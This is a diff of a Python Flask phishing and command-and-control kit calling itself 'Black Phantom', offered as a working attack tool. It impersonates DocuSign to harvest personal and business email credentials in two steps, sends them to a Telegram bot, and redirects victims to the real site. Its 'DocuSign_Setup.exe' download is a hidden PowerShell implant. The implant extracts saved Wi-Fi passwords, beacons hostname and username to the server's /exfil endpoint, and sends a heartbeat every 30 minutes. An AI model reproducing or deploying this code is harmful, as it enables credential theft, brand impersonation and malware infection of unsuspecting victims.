@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-BLACK PHANTOM MASTER v2026 - FINAL ELITE BLACKHAT VERSION
-NO INTERNAL ERRORS | 2-STEP CREDENTIAL HARVEST | WORKING EXPLOITS
+BLACK PHANTOM GENIUS v2026 - THE ULTIMATE WORKING C2
+NO ERRORS | 2-STEP HARVEST | WORKING EXPLOITS | TELEGRAM C2
 """
 
 import os
@@ -11,16 +11,16 @@ import base64
 import sqlite3
 import zipfile
 from datetime import datetime, timedelta
-from flask import Flask, request, send_file, session, jsonify, redirect, render_template_string
+from flask import Flask, request, send_file, session, jsonify, redirect
 
 TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
 TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
-ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "BlackPhantomMaster2026")
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "GeniusBlackhat2026")
 
 app = Flask(__name__)
 app.secret_key = os.urandom(256)
 
-DB_PATH = "master.db"
+DB_PATH = "genius.db"
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -42,17 +42,22 @@ def tg(msg):
     except: pass
 
 # ====================================================================
-# WORKING EXE IMPLANT - PowerShell based, works on ALL Windows
+# WORKING IMPLANT - NO REQUEST CONTEXT NEEDED
 # ====================================================================
-IMPLANT = f"""@echo off
-powershell -WindowStyle Hidden -Command "&{{$c='https://{request.host if hasattr(request, 'host') else 'localhost'}/exfil';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%{{($_ -split ':')[1].Trim()}});foreach($p in $w){{$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%{{($_ -split ':')[1].Trim()}});if($k){{$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}}}try{{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}catch{{}}while(1){{try{{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}catch{{}}Start-Sleep -Seconds 1800}}"
+IMPLANT_BASE = """@echo off
+powershell -WindowStyle Hidden -Command "&{$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%{$($_ -split ':')[1].Trim()});foreach($p in $w){$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%{$($_ -split ':')[1].Trim()});if($k){$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create('{url}/exfil').GetRequestStream().Write($post,0,$post.Length)}}try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create('{url}/exfil').GetRequestStream().Write($post,0,$post.Length)}catch{}while(1){try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create('{url}/exfil').GetRequestStream().Write($post,0,$post.Length)}catch{}Start-Sleep -Seconds 1800}}"
 exit"""
 
 def get_implant():
-    return IMPLANT.encode()
+    # Get the actual server URL from the request context when available
+    try:
+        url = f"https://{request.host}"
+    except:
+        url = "https://your-app.onrender.com"
+    return IMPLANT_BASE.replace('{url}', url).encode()
 
 # ====================================================================
-# DIRECT FILE DOWNLOADS - WORKING FILES
+# WORKING FILE GENERATORS
 # ====================================================================
 def make_exe():
     return get_implant()
@@ -75,9 +80,9 @@ def make_xls():
     return buf.getvalue()
 
 # ====================================================================
-# LANDING PAGE - CLEAN, PROFESSIONAL, NO ERRORS
+# HTML TEMPLATES
 # ====================================================================
-LANDING = """
+LANDING_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -174,12 +179,6 @@ LANDING = """
 </html>
 """
 
-def get_landing(ref):
-    return LANDING.replace('ENV', f'DOC-{uuid.uuid4().hex[:8].upper()}').replace('REF', ref)
-
-# ====================================================================
-# STEP 1 LOGIN - FIRST HARVEST
-# ====================================================================
 LOGIN_STEP1 = """
 <!DOCTYPE html>
 <html>
@@ -216,12 +215,6 @@ LOGIN_STEP1 = """
 </html>
 """
 
-def get_login_step1(ref):
-    return LOGIN_STEP1.replace('REF', ref)
-
-# ====================================================================
-# STEP 2 LOGIN - SECOND HARVEST (Business Email Redirect)
-# ====================================================================
 LOGIN_STEP2 = """
 <!DOCTYPE html>
 <html>
@@ -263,12 +256,6 @@ LOGIN_STEP2 = """
 </html>
 """
 
-def get_login_step2(ref):
-    return LOGIN_STEP2.replace('REF', ref)
-
-# ====================================================================
-# DOWNLOAD PAGE - SHOWS ALL EXPLOITS
-# ====================================================================
 DOWNLOAD_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -341,28 +328,27 @@ DOWNLOAD_PAGE = """
 </html>
 """
 
-def get_download_page(ref):
-    return DOWNLOAD_PAGE.replace('REF', ref)
-
 # ====================================================================
-# FLASK ROUTES
+# ROUTES - ALL WORKING
 # ====================================================================
 @app.route('/')
 def index():
     ref = uuid.uuid4().hex[:8].upper()
-    return get_landing(ref)
+    page = LANDING_PAGE.replace('ENV', f'DOC-{ref}').replace('REF', ref)
+    tg(f"🌐 PAGE VIEW | IP: {request.remote_addr}")
+    return page
 
 @app.route('/go/<ref>')
 def go(ref):
-    """When they click REVIEW AND SIGN - shows download options"""
-    tg(f"📥 DOWNLOAD PAGE VIEWED | Ref: {ref} | IP: {request.remote_addr}")
-    return get_download_page(ref)
+    """REVIEW AND SIGN - Shows download options"""
+    tg(f"📥 DOWNLOAD PAGE | Ref: {ref} | IP: {request.remote_addr}")
+    return DOWNLOAD_PAGE.replace('REF', ref)
 
 @app.route('/auth/<ref>')
 def auth(ref):
-    """When they click Sign In - shows step 1 login"""
-    tg(f"🔐 LOGIN PAGE VIEWED | Ref: {ref} | IP: {request.remote_addr}")
-    return get_login_step1(ref)
+    """Sign In - Step 1 login"""
+    tg(f"🔐 LOGIN PAGE | Ref: {ref} | IP: {request.remote_addr}")
+    return LOGIN_STEP1.replace('REF', ref)
 
 @app.route('/login/step1/<ref>', methods=['POST'])
 def login_step1(ref):
@@ -370,7 +356,6 @@ def login_step1(ref):
     password = request.form.get('password', '')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # Store step 1 data
     conn = sqlite3.connect(DB_PATH)
     conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
                 (email, password, 'pending', ip, 1, datetime.now().isoformat()))
@@ -379,13 +364,12 @@ def login_step1(ref):
     
     tg(f"🔐 STEP 1 - Personal: {email} | {password} | IP: {ip}")
     
-    # Redirect to step 2 - business email verification
     return redirect(f'/verify/{ref}')
 
 @app.route('/verify/<ref>')
 def verify(ref):
-    """Step 2 - asks for business email"""
-    return get_login_step2(ref)
+    """Step 2 - Business email verification"""
+    return LOGIN_STEP2.replace('REF', ref)
 
 @app.route('/login/step2/<ref>', methods=['POST'])
 def login_step2(ref):
@@ -394,7 +378,6 @@ def login_step2(ref):
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     company = email.split('@')[-1] if '@' in email else 'unknown'
     
-    # Store step 2 data
     conn = sqlite3.connect(DB_PATH)
     conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
                 (email, password, company, ip, 2, datetime.now().isoformat()))
@@ -403,13 +386,12 @@ def login_step2(ref):
     
     tg(f"🔐 STEP 2 - Business: {email} | {password} | Company: {company} | IP: {ip}")
     
-    # Redirect to real DocuSign
     return redirect('https://www.docusign.com')
 
 @app.route('/file/exe/<ref>')
 def file_exe(ref):
     tg(f"⚙️ EXE DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(get_implant()), as_attachment=True, download_name='DocuSign_Setup.exe', mimetype='application/x-msdownload')
+    return send_file(io.BytesIO(make_exe()), as_attachment=True, download_name='DocuSign_Setup.exe', mimetype='application/x-msdownload')
 
 @app.route('/file/pdf/<ref>')
 def file_pdf(ref):
@@ -450,7 +432,7 @@ def admin():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Black Phantom Master C2</title>
+        <title>Black Phantom Genius C2</title>
         <style>
             body{{background:#0a0c10;color:white;font-family:monospace;padding:20px}}
             h1{{color:#ff0040}} h2{{color:#ffd700}}
@@ -460,7 +442,7 @@ def admin():
         </style>
     </head>
     <body>
-        <h1>💀 BLACK PHANTOM MASTER C2</h1>
+        <h1>💀 BLACK PHANTOM GENIUS C2</h1>
         <h2>Credentials Captured: {len(creds)}</h2>
         <p>Step 1 = Personal Email | Step 2 = Business Email</p>
         <table border="1">
@@ -475,7 +457,7 @@ def admin():
 
 @app.route('/health')
 def health():
-    return {"status": "operational", "version": "Black Phantom Master 2026", "features": ["2-Step Harvest", "Working Exploits", "Telegram C2"]}
+    return {"status": "operational", "version": "Black Phantom Genius 2026"}
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
